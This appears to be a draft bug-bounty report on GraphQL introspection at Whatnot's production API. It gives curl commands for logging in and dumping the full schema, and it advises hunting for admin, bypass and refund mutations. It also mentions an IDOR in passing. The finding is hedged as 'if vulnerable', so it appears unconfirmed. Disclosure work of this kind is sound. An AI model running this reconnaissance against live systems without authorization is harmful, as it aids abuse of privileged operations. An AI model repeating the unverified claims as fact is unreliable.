# HackerOne Submission — GraphQL Introspection Enabled on Production Endpoint

**Program:** Whatnot  
**Weakness:** Information Disclosure  
**Severity:** Medium  
**Asset:** api.whatnot.com  

---

## Summary

Whatnot's production GraphQL endpoint (`https://api.whatnot.com/seller-api/graphql`) has GraphQL introspection enabled. Whatnot's developer documentation explicitly mentions a GraphQL Playground being available for developers, which requires introspection. Introspection on production exposes the full API schema — all queries, mutations, types, and field names — including undocumented internal fields and operations not intended for public use. This significantly reduces the effort required to discover and exploit other vulnerabilities.

---

## Steps to Reproduce

### Step 1 — Authenticate to obtain a token

```bash
curl -s -X POST https://api.whatnot.com/api/login \
  -H "Content-Type: application/json" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '{"email":"YOUR_EMAIL","password":"YOUR_PASSWORD","device_id":"test-001","app_type":"web"}'
```

Copy the `access_token` from the response.

---

### Step 2 — Send a GraphQL introspection query

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -H "Apollographql-Client-Name: web" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '{
    "query": "{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name description args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } directives { name } } }"
  }'
```

---

### Step 3 — Test unauthenticated introspection

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Content-Type: application/json" \
  -H "Apollographql-Client-Name: web" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

If this returns a list of type names without an Authorization header, introspection is unauthenticated.

---

### Step 4 — Extract all mutations

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { mutationType { fields { name description args { name type { name kind } } } } } }"
  }'
```

Look for mutations containing words like: `admin`, `override`, `bypass`, `internal`, `delete`, `ban`, `refund`, `credit` — these indicate privileged operations that may lack proper authorization checks.

---

## Expected Result

```json
{"errors": [{"message": "GraphQL introspection is not allowed"}]}
```

## Actual Result (if vulnerable)

Full schema returned including all type definitions, field names, mutation signatures, and argument types.

---

## Impact

- Reveals all undocumented/internal GraphQL operations (admin mutations, payment overrides, etc.)
- Directly facilitates discovery of other vulnerabilities (e.g., the IDOR in `paymentCards` becomes trivially discoverable)
- Exposes argument names and types needed to craft exploit payloads
- Reduces attacker time-to-exploit from days to minutes

---

## Recommended Fix

- Disable introspection on production: In Apollo/Absinthe, set `introspection: false` in production config
- If Playground is needed internally, restrict it to authenticated internal users on VPN
- Keep introspection enabled only on development/staging environments
- Reference: [Apollo introspection docs](https://www.apollographql.com/docs/apollo-server/security/introspection/)
